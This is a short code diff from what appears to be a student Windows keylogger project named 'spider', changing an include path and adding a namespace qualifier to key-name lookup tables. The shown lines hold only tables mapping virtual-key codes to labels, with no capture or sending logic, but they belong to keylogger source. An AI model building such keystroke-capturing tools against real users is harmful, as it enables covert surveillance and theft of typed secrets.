@@ -7,9 +7,9 @@
 // Started on  Fri Sep 29 16:20:42 2017 Jeremy Thoveron
 // Last update Fri Sep 29 16:20:55 2017 Jeremy Thoveron
 //
-#include	"WindowsKeyLogger.hpp"
+#include	"KeyLogger/WindowsKeyLogger.hpp"
 
-std::map<DWORD, std::string> const WindowsKeyLogger::keys = {
+std::map<DWORD, std::string> const spider::WindowsKeyLogger::keys = {
   { VK_ADD, "Numpad +" },
   { VK_ATTN, "Attn" },
   { VK_BACK, "Backspace" },
@@ -153,7 +153,7 @@ std::map<DWORD, std::string> const WindowsKeyLogger::keys = {
   { VK_VOLUME_UP, "Volume Up" }
 };
 
-std::map<int, std::string> const WindowsKeyLogger::correlingTable =
+std::map<int, std::string> const spider::WindowsKeyLogger::correlingTable =
   {
     {38, "1"},
     {130, "2"},
